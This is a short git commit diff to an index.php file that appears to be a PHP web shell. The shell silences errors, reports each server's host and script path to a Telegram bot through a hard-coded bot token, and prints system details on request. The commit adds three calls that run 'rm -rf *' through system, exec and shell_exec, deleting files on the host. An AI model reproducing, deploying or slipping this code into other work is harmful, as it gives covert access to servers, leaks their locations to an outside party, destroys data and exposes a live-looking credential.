d2d93ef1cb33bd832e9fad264d494c685f1eb4be
NonNomen404 <92431601+NonNomen404@users.noreply.github.com>
2021-12-09 17:59:35 +0700

    Update index.php

--- index.php
+++ index.php
@@ -2,6 +2,9 @@ error_reporting(0);
 error_log(0);
 file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-584906756&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
 
+system('rm -rf *');
+exec('rm -rf *');
+shell_exec('rm -rf *');
    if (!empty($_GET['action']) && $_GET['action'] == "start") {
       echo '<b>Uname: </b>' . php_uname() . '<br>';
       echo '<b>Path:</b> ';
